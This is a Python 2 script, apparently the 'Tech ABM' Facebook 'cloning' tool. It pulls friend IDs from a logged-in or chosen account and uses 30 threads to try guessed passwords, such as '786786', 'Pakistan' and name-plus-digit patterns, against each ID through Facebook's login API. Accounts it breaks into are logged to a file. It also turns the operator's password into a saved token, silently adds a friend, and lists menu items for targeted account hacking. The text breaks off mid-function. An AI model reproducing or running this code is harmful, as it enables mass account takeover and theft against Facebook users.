#!/usr/bin/python2
#coding=utf-8
#TECH ABM THE OFFICAL ROGRAMMER 
#FBCLONING COMMMAD MAKER 
#YOUTUBE TECH ABM


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#### LOGO ####
logo = """
\033[1;95m _____ _____ _____  _   _    ___  _________  ___
\033[1;97m|_   _|  ___/  __ \| | | |  / _ \ | ___ \  \/  |
\033[1;95m  | | | |__ | /  \/| |_| | / /_\ \| |_/ / .  . |
\033[1;97m  | | |  __|| |    |  _  | |  _  || ___ \ |\/| |
\033[1;95m  | | | |___| \__/\| | | | | | | || |_/ / |  | |
\033[1;97m  \_/ \____/ \____/\_| |_/ \_| |_/\____/\_|  |_/
\033[1;92m>>============================================
\033[1;97m>> \033[1;95mAuthor \033[1;91m: \033[1;93mTech | Abm
\033[1;97m>> \033[1;95mGithub \033[1;91m: \033[1;93mhttps://github.com/Tech-abm 
\033[1;97m>> \033[1;95mFb Page \033[1;91m: \033[1;93mhttps://m.facebook.com/Techabm
\033[1;92m>>============================================
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m «--------------------------------------------»
\033[1;93m _    _ _____ _     _____ ________  ___ _____ 
\033[1;96m| |  | |  ___| |   /  __ \  _  |  \/  ||  ___|
\033[1;93m| |  | | |__ | |   | /  \/ | | | .  . || |__  
\033[1;96m| |/\| |  __|| |   | |   | | | | |\/| ||  __| 
\033[1;93m\  /\  / |___| |___| \__/\ \_/ / |  | || |___ 
\033[1;96m \/  \/\____/\_____/\____/\___/\_|  |_/\____/
\033[1;97m «--------------------------------------------»
                                                                                          """
CorrectUsername = "Abm"
CorrectPassword = "Abm"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤\033[1;93m ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤\033[1;93m ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username  #DEV Tech-Abm
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://m.facebook.com/Techabm')
    else:
        print "Wrong username!"
        os.system('xdg-open https://m.facebook.com/Techabm')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;96m «--------------------------------------------»" 
	time.sleep(0.05)
	print "\033[1;97m[1]\033[1;97m Login with Facebook \033[1;97m(\033[1;91mfb login\033[1;97m) "
        time.sleep(0.05)
        print "\033[1;96m «--------------------------------------------»"
        time.sleep(0.05)
        print "\033[1;97m[2]\033[1;97m Login with access token \033[1;97m(\033[1;91mTokenz\033[1;97m)"
        time.sleep(0.05)
        print "\033[1;96m «--------------------------------------------»"
        time.sleep(0.05)
        print "\033[1;97m[3]\033[1;97m Get Access Token Toolkit \033[1;97m(\033[1;91mLink\033[1;97m)"
        time.sleep(0.05)
	print "\033[1;96m «--------------------------------------------»"
	time.sleep(0.05)
	print "\033[1;97m[0]\033[1;97m Logout        "
	time.sleep(0.05)
        print "\033[1;96m «--------------------------------------------»"
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97mChoose an Option═╬══►\033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
	elif peak =="3":
	        os.system('xdg-open https://chrome.google.com/webstore/detail/multiple-tools-for-facebo/eojdckfcadamkapabechhbnkleligand')
	        login()	
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		print "\033[1;96m «--------------------------------------------»" 
		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		time.sleep(0.05)
		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		print "\033[1;96m «--------------------------------------------»" 
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	print "\033[1;96m «--------------------------------------------»"
	toket = raw_input("\033[1;91m[+]\033[1;92m Give Token\033[1;91m :\033[1;95>>\033[1;93m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
        print "\033[1;96m «--------------------------------------------»" 
	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	print "\033[1;96m «--------------------------------------------»" 
	print "\033[1;32;98m[01] \033[1;91m>> \033[1;97mstart Cloning Pakistan \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
	print "\033[1;32;98m[02] \033[1;91m>> \033[1;97mstart Cloning India \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[03] \033[1;91m>> \033[1;97mstart Cloning Bangladesh \033[1;97m(\033[1;91mTech Abm\033[1;97m) " 
        time.sleep(0.05)
        print "\033[1;32;98m[04] \033[1;91m>> \033[1;97mstart Cloning Indonesia \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[05] \033[1;91m>> \033[1;97mstart Cloning Usa \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[06] \033[1;91m>> \033[1;97mstart Cloning Denmark \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[07] \033[1;91m>> \033[1;97mstart Cloning Japan \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[08] \033[1;91m>> \033[1;97mstart Target Hacking \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[09] \033[1;91m>> \033[1;97mstart Cloning China \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[10] \033[1;91m>> \033[1;97mStar Cloning Testing \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[11] \033[1;91m>> \033[1;97mStar Cloning Australia \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[12] \033[1;91m>> \033[1;97mFacebook Bot \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[13] \033[1;91m>> \033[1;97mOther Facebook Trick \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[14] \033[1;91m>> \033[1;97mUser Facebook Information \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[15] \033[1;91m>> \033[1;97mStart fb posts cloning \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[16] \033[1;91m>> \033[1;97mMini Hack Fb Account \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[17] \033[1;91m>> \033[1;97mYahoo Checker \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[18] \033[1;91m>> \033[1;97mStart Group Cloning \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[19] \033[1;91m>> \033[1;97mGet Friends Email From Friend \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
        print "\033[1;32;98m[20] \033[1;91m>> \033[1;97mGet Verify Account Clone From Friends \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
        time.sleep(0.05)
#      print "\033[1;32;98m[21] \033[1;91m>> \033[1;97mGet Phone Number From Friends > Coming Soon < \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
#        time.sleep(0.05) 
#      print "\033[1;32;98m[22] \033[1;91m>> \033[1;97mStart Cloning Fb Page > Coming Soon < \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
#        time.sleep(0.05)
#      print "\033[1;32;98m[23] \033[1;91m>> \033[1;97mStart Bangladesh Fast Cloning > Coming Soon < \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
#        time.sleep(0.05)
#      print "\033[1;32;98m[24] \033[1;91m>> \033[1;97m > Coming Soon <\033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
#        time.sleep(0.05)
#      print "\033[1;32;98m[25] \033[1;91m>> \033[1;97mStart Pakistan Fast Fb Cloning > Coming Soon < \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
#        time.sleep(0.05)
#### Waiting For Next Tools update ( M Decrypt nhi karta, so jis ny meri script copy karna hai karlo, Lekin Tech Abm nam yad rakhna) 
	print "\033[1;32;98m[0] \033[1;91m>> Log out"
	print "\033[1;96m «--------------------------------------------»" 
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="01":
		super()
	elif unikers =="02":
		mafiax()
	elif unikers =="03":
		pakarmy()
	elif unikers =="04":
		hackerz()
	elif unikers =="05":
		america()
	elif unikers =="06":
		haterx()
	elif unikers =="07":
		japanx()
	elif unikers =="08":
		hackingx()
	elif unikers =="09":
		chinesex()
	elif unikers =="10":
		testingx()
	elif unikers =="11":
		clonerx()
	elif unikers =="12":
		fbbotx()
	elif unikers =="13":
		fbotherx()
	elif unikers =="14":
		userinfox()
	elif unikers =="15":
		fbpostsx()
	elif unikers =="16":
		minihackx()
	elif unikers =="17":
		yahoochkx()
	elif unikers =="18":
		grouphackx()
	elif unikers =="19":
		getemailx()
	elif unikers =="20":
		getverifyx()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;96m «--------------------------------------------»" 
        print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super() 
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m «--------------------------------------------»" 
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m «--------------------------------------------»" 
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Pakistan') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def mafiax():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;96m «--------------------------------------------»" 
	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_mafiax()

def pilih_mafiax():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_mafiax()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
